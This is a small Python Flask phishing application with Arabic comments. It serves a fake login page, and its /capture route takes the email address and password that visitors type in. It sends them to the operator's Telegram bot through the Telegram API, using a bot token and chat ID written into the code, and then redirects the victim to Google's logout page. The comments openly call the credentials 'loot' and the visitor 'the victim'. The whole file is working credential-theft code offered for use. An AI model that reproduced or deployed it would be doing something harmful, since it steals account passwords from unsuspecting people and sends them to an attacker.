import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# --- بياناتك هنا ---
TOKEN = "8501788737:AAGT30o-tywPq3G7tr1bDPyq_8pnQahOL7o"
CHAT_ID = "8133357563"

@app.route('/')
def home():
    # لاحظ هنا استدعينا index.html لأنك سميته هكذا
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # إرسال الغنيمة لتلجرام
    text = f"🎯 صيد جديد:\n📧 الإيميل: `{email}`\n🔑 الباسورد: `{password}`"
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
    
    # توجيه الضحية لصفحة خروج جوجل
    return redirect("https://accounts.google.com/Logout")

if __name__ == "__main__":
    app.run()
  
